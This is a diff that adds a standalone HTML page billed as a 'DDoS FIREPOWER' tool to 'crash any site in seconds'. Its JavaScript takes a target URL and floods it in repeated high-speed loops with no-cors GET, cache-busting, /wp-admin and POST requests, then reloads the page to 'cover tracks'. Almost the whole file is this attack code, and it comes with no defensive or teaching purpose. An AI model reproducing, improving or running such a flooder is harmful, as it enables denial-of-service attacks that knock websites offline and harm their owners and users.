@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>💀 DDoS FIREPOWER 💀</title>
+</head>
+<body>
+    <h1>WEB DDoS TOOL - CRASH ANY SITE IN SECONDS</h1>
+    
+    <input type="text" id="targetUrl" placeholder="Target URL (http://example.com)">
+    <input type="number" id="requests" placeholder="Jumlah Request (1000+)">
+    <input type="number" id="threads" placeholder="Threads (50+)">
+    <input type="number" id="duration" placeholder="Duration (seconds)">
+    
+    <button onclick="START_ATTACK()">🔥 LAUNCH FUCKING ATTACK 🔥</button>
+
+    <script>
+        async function FLOOD_TARGET() {
+            const target = document.getElementById('targetUrl').value;
+            const requests = document.getElementById('requests').value;
+            
+            for(let i=0; i<requests; i++) {
+                fetch(target, {mode: 'no-cors'}) // BYPASS CORS
+                .catch(() => {});
+                
+                // MULTI-VECTOR FLOOD
+                fetch(target + '?cachebust=' + Math.random(), {mode: 'no-cors'});
+                fetch(target + '/wp-admin', {mode: 'no-cors'}); // TARGET WORDPRESS
+                fetch(target, {method: 'POST', body: 'DEAD=' + Math.random()});
+            }
+        }
+
+        function START_ATTACK() {
+            const threads = document.getElementById('threads').value;
+            const duration = document.getElementById('duration').value * 1000;
+            
+            // CREATE BOTNET SIMULATION
+            for(let t=0; t<threads; t++) {
+                setInterval(FLOOD_TARGET, 10); // HIGH SPEED
+            }
+            
+            setTimeout(() => {
+                window.location.reload(); // COVER TRACKS
+            }, duration);
+        }
+    </script>
+</body>
+</html>
